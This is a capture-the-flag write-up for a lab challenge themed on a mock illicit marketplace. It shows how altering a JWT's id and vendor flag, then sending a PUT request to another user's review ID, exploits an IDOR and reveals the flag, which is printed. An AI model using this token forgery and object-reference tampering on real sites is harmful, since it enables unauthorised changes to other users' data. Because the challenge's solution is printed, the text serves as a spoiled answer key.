# The Borrowed Reputation

## Challenge Description

Marketplace reviews look tidy from the outside, but one operator's reputation can be rewritten if the wrong handle gets trusted.

## Solution

Go to the product page `http://159.89.230.27/listing/rat-builder`. Each review has a `review-id`, for example, `seed-shadow-op`, `seed-phantom-hacker`, and `seed-cyberghost`.

![alt text](image.png)

At first, I thought I needed to change my JWT id to one of their `user_id`s. After changing it, an extra input box appeared.

```json
{
  "id": "xyz78",
  "email": "f@f",
  "isVendor": true,
  "iat": 1782136505,
  "exp": 1782741305
}
```

![alt text](image-1.png)

After making an arbitrary change, you can see how it updates the review:

```js
fetch("http://159.89.230.27/api/reviews/seed-cyberghost", {
  "headers": {
    "accept": "*/*",
    "accept-language": "zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-Hant;q=0.6,und;q=0.5",
    "content-type": "application/json"
  },
  "referrer": "http://159.89.230.27/listing/rat-builder",
  "body": "{\"reviewText\":\"Worth every penny. Client was shocked at how quickly we got domain aeeeedmin. Stealth features are next level.\"}",
  "method": "PUT",
  "mode": "cors",
  "credentials": "include"
});

```

Which is `PUT /api/reviews/<reviewId>`. The review is identified solely by its id, so this is an IDOR. As long as you are a logged-in user, you can modify someone else's review. The response will return the review's `moderationNote` along with it, and the flag is hidden inside.

After some trial and error, modifying the `seed-phantom-hacker` review yields the flag. I didn't get it when modifying the others, not sure why.

```json
{
    "success": true,
    "review": {
        "id": "seed-phantom-hacker",
        "listingId": "rat-builder",
        "userId": "k7m3n",
        "reviewText": "Worth every penny. Client was shocked at how quickly we got domain aeeeedmin. Stealth features are next level.",
        "filename": "rat_screenshot.jpg",
        "fileHash": "0c7406664fa3077c4a9a535f424d7ecd",
        "proofPath": "rat-builder/rat_screenshot.jpg",
        "moderationNote": "bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}",
        "createdAt": "2026-06-22T16:30:12.810Z"
    },
    "moderationNote": "bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}",
    "message": "Review updated successfully."
}
```

## Flag

```text
bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}
```
